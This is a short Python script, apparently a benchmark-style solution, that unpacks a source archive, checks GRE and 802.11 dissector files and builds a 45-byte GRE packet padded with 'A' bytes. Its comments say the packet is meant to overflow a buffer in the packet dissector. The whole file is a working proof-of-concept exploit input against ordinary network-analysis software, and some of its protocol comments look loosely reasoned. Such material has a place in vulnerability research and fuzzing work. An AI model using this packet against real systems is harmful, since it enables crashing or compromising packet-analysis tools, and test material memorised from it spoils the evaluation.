import os
import struct
import tempfile
import subprocess
import re
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            subprocess.run(['tar', '-xf', src_path, '-C', tmpdir], 
                          capture_output=True, check=False)
            
            # Look for relevant dissector files
            gre_file = None
            wlan_file = None
            
            for root, dirs, files in os.walk(tmpdir):
                for file in files:
                    if 'packet-gre' in file and file.endswith('.c'):
                        gre_file = os.path.join(root, file)
                    elif 'packet-80211' in file and file.endswith('.c'):
                        wlan_file = os.path.join(root, file)
            
            # Analyze the files to understand the structure
            proto_type = 0x6558  # Default IEEE 802.11 protocol type
            
            if gre_file and os.path.exists(gre_file):
                with open(gre_file, 'r') as f:
                    content = f.read()
                    # Look for protocol type registration
                    match = re.search(r'0x([0-9a-fA-F]{4}).*802\.?11', content, re.IGNORECASE)
                    if match:
                        proto_type = int(match.group(1), 16)
            
            # Construct the PoC packet
            # GRE header structure:
            # Bits 0-2: C, R, K flags (all 0)
            # Bits 3-12: Reserved/S flags (0)
            # Bits 13-15: Version (0)
            gre_flags = 0x0000  # No flags, version 0
            
            # Protocol type for 802.11
            proto_type_bytes = struct.pack('>H', proto_type)
            
            # Construct the 802.11 pseudoheader that will be misinterpreted
            # The GRE dissector passes flags and version as pseudoheader
            # We need enough data to cause buffer overflow
            # 45 bytes total: 4 bytes GRE header + 41 bytes payload
            payload = b'A' * 41  # Fill with pattern that triggers overflow
            
            # Build final packet
            poc = struct.pack('>H', gre_flags) + proto_type_bytes + payload
            
            return poc
